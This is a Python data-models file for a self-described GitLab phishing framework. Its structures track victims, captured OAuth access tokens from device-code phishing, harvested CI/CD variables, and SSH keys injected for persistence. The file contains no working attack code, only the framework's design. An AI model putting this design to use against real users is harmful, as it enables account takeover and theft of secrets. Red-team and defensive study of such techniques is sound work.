"""
Data models for the GitLab Phishing Framework.
"""

from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import List, Optional


class OperationPhase(Enum):
    """Enumeration of operation phases."""
    CREATED = "created"
    RUNNING = "running"
    WAITING = "waiting"
    POLLING = "polling"
    AUTHORIZED = "authorized"
    ENUMERATING = "enumerating"
    PERSISTING = "persisting"
    COMPLETED = "completed"
    STOPPED = "stopped"
    ERROR = "error"


@dataclass
class Config:
    """Main configuration for the framework."""
    
    # Server settings
    admin_port: int = 3000
    phishing_port: int = 8080
    host: str = "0.0.0.0"
    
    # Database
    db_path: str = "data/gitlab_phishing.db"
    
    # Logging
    log_level: str = "INFO"
    log_dir: str = "logs/"
    
    # Results
    results_dir: str = "results/"
    ssh_keys_dir: str = "results/ssh_keys/"
    
    # Timeouts
    polling_timeout: int = 900  # 15 minutes
    api_timeout: int = 30
    
    # Rate limiting
    max_retries: int = 3
    retry_delay: int = 5
    
    # GitLab defaults
    default_gitlab_url: str = "https://gitlab.com"
    
    # SSL verification (set to False for self-signed certificates)
    verify_ssl: bool = True


@dataclass
class OperationConfig:
    """Configuration for a specific phishing operation."""
    operation_id: int
    name: str
    instance_type: str  # 'saas' or 'self-managed'
    base_url: str       # 'https://gitlab.com' or custom URL
    client_id: str
    scopes: List[str]
    template: Optional[str] = None


@dataclass
class DeviceCodeResponse:
    """Response from GitLab device code generation."""
    device_code: str
    user_code: str
    verification_uri: str
    verification_uri_complete: str
    expires_in: int
    interval: int
    created_at: datetime = field(default_factory=datetime.now)
    
    def is_expired(self) -> bool:
        """Check if the device code has expired."""
        elapsed = (datetime.now() - self.created_at).total_seconds()
        return elapsed >= self.expires_in


@dataclass
class OperationStatus:
    """Current status of a phishing operation."""
    operation_id: int
    phase: OperationPhase
    victims_count: int
    tokens_captured: int
    projects_discovered: int
    ssh_keys_injected: int
    last_activity: datetime
    error_message: Optional[str] = None
    
    def to_dict(self) -> dict:
        """Convert to dictionary for JSON serialization."""
        return {
            'operation_id': self.operation_id,
            'phase': self.phase.value,
            'victims_count': self.victims_count,
            'tokens_captured': self.tokens_captured,
            'projects_discovered': self.projects_discovered,
            'ssh_keys_injected': self.ssh_keys_injected,
            'last_activity': self.last_activity.isoformat(),
            'error_message': self.error_message
        }


@dataclass
class VictimInfo:
    """Information about a victim."""
    victim_id: int
    operation_id: int
    user_code: str
    device_code: str
    ip_address: Optional[str] = None
    user_agent: Optional[str] = None
    status: str = "pending"  # pending, code_copied, redirected, authorized, failed
    username: Optional[str] = None
    email: Optional[str] = None
    user_id: Optional[int] = None
    created_at: datetime = field(default_factory=datetime.now)
    authorized_at: Optional[datetime] = None


@dataclass
class TokenInfo:
    """Information about a captured token."""
    token_id: int
    victim_id: int
    access_token: str
    token_type: str = "Bearer"
    scope: Optional[str] = None
    captured_at: datetime = field(default_factory=datetime.now)


@dataclass
class ProjectInfo:
    """Information about a GitLab project."""
    project_id: int
    victim_id: int
    gitlab_project_id: int
    name: str
    path: Optional[str] = None
    visibility: Optional[str] = None
    namespace: Optional[str] = None
    description: Optional[str] = None
    web_url: Optional[str] = None
    discovered_at: datetime = field(default_factory=datetime.now)


@dataclass
class CIVariableInfo:
    """Information about a CI/CD variable."""
    variable_id: int
    project_id: int
    key: str
    value: Optional[str] = None
    masked: bool = False
    protected: bool = False
    discovered_at: datetime = field(default_factory=datetime.now)


@dataclass
class SSHKeyInfo:
    """Information about an injected SSH key."""
    key_id: int
    victim_id: int
    key_title: str
    public_key: str
    private_key_path: str
    fingerprint: Optional[str] = None
    uploaded_at: datetime = field(default_factory=datetime.now)


@dataclass
class ActivityLog:
    """Activity log entry."""
    log_id: int
    operation_id: int
    event_type: str
    message: str
    timestamp: datetime = field(default_factory=datetime.now)
    
    def to_dict(self) -> dict:
        """Convert to dictionary for JSON serialization."""
        return {
            'log_id': self.log_id,
            'operation_id': self.operation_id,
            'event_type': self.event_type,
            'message': self.message,
            'timestamp': self.timestamp.isoformat()
        }
